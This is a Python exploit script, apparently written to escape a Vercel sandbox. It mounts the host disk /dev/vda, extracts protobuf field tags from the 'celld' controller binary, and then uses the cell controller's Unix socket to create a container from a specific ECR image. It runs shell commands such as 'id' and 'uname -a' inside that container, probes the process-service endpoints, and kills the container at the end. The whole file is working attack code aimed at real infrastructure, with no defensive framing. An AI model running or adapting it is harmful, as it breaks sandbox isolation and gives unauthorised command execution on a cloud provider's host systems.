# -*- coding: utf-8 -*-
"""vda17_exec_proto: 挖 ExecRequest proto 字段 + Connect 双协议执行链
P0: 挖 ExecRequest/StreamOutputRequest 等 protobuf 字段标签
P1: Create/Start (application/json, unary)
P2: Exec (application/connect+json + 半关闭写端)
P3: Exec (connect+proto: 5字节信封 + 手工 protobuf)
P4: StreamOutput (connect+proto)
输出落盘 + 哨兵 V17D_DONE"""
import os, time, socket, ctypes, re, struct

OUT = '/vercel/sandbox/v17d.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_raw(sockpath, path, body, ctype, t=6, shutdown_wr=True):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        if isinstance(body, str):
            body = body.encode()
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        if shutdown_wr:
            try:
                s.shutdown(socket.SHUT_WR)
            except Exception:
                pass
        data = b''
        while True:
            try:
                chunk = s.recv(16384)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:800].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def env_proto(payload):
    """connect-proto / gRPC 信封: 1字节 flag + 4字节 BE 长度 + payload"""
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pstr(field_no, s):
    """protobuf string 字段编码"""
    b = s.encode()
    tag = (field_no << 3) | 2
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    l = len(b)
    while l > 127:
        out.append((l & 127) | 128)
        l >>= 7
    out.append(l)
    return bytes(out) + b


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    sp = '/mnt/vdax/run/cell/cell.sock'
    IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
    CSVC = '/vercel.hive.cell.api.containers.v1.ContainersService'
    PSVC = '/vercel.hive.cell.api.processes.v1.ProcessService'

    # P0: 挖字段
    log('=== P0 proto fields ===')
    try:
        data = open('/mnt/vdax/opt/vercel/celld', 'rb').read()
        txt = b'\n'.join(re.findall(rb'[\x20-\x7e]{6,}', data)).decode(errors='replace')
        for msg in ['ExecRequest', 'StreamOutputRequest', 'exec.Request']:
            idxs = [m.start() for m in re.finditer(re.escape(msg), txt)][:2]
            for i in idxs:
                seg = txt[i:i + 900].replace('\n', ' ')
                tags = re.findall(r'name=([a-z_0-9]+)[^"]{0,120}json:"([a-z_0-9]+),omitempty"', seg)
                log('%s seg tags: %s' % (msg, tags[:12]))
                proto_tags = re.findall(r'protobuf:"[a-z_ ]+,([0-9]+),opt,name=([a-z_0-9]+)', seg)
                log('%s proto: %s' % (msg, proto_tags[:12]))
    except Exception as e:
        log('P0 ERR %s' % e)

    # P1: Create + Start (json)
    log('=== P1 Create+Start (json) ===')
    cid = None
    st, bd = rpc_raw(sp, CSVC + '/Create', '{"image":"%s","command":"/bin/sleep 300"}' % IMG,
                     'application/json', t=15)
    log('create -> %s | %s' % (st, bd[:250]))
    m = re.search(r'"containerId":\s*"([^"]+)"', bd)
    if m:
        cid = m.group(1)
        log('CID=%s' % cid)
    if cid:
        st, bd = rpc_raw(sp, CSVC + '/Start', '{"container_id":"%s"}' % cid, 'application/json', t=6)
        log('start -> %s | %s' % (st, bd[:200]))

    # P2: Exec connect+json (半关闭)
    log('=== P2 Exec connect+json ===')
    if cid:
        st, bd = rpc_raw(sp, CSVC + '/Exec', '{"container_id":"%s","command":"id"}' % cid,
                         'application/connect+json', t=8)
        log('exec json -> %s | %s' % (st, bd[:300].replace('\n', ' ')))

    # P3: Exec connect+proto (字段 1=container_id, 2=command)
    log('=== P3 Exec connect+proto ===')
    if cid:
        payload = pstr(1, cid) + pstr(2, 'id')
        st, bd = rpc_raw(sp, CSVC + '/Exec', env_proto(payload), 'application/connect+proto', t=8)
        log('exec proto f1,f2 -> %s | %s' % (st, bd[:300].replace('\n', ' ')))
        payload = pstr(1, cid) + pstr(2, '/bin/sh -c id;uname -a')
        st, bd = rpc_raw(sp, CSVC + '/Exec', env_proto(payload), 'application/connect+proto', t=8)
        log('exec proto cmd -> %s | %s' % (st, bd[:300].replace('\n', ' ')))

    # P4: StreamOutput connect+proto
    log('=== P4 StreamOutput connect+proto ===')
    if cid:
        payload = pstr(1, cid)
        st, bd = rpc_raw(sp, CSVC + '/StreamOutput', env_proto(payload), 'application/connect+proto', t=6)
        log('stream proto -> %s | %s' % (st, bd[:300].replace('\n', ' ')))

    # P5: Process StreamOutput connect+proto (hvcp_+27hex)
    log('=== P5 Process connect+proto ===')
    pid27 = 'hvcp_' + 'a' * 27
    for mth, flds in [('StreamOutput', [pstr(1, pid27)]), ('Wait', [pstr(1, pid27)])]:
        payload = b''.join(flds)
        st, bd = rpc_raw(sp, PSVC + '/' + mth, env_proto(payload), 'application/connect+proto', t=5)
        log('proc %s -> %s | %s' % (mth, st, bd[:250].replace('\n', ' ')))
        time.sleep(0.4)

    # P6: Kill
    if cid:
        st, bd = rpc_raw(sp, CSVC + '/Kill', '{"container_id":"%s"}' % cid, 'application/json', t=5)
        log('kill -> %s | %s' % (st, bd[:150]))

    log('V17D_DONE')
    f.close()


if __name__ == '__main__':
    main()
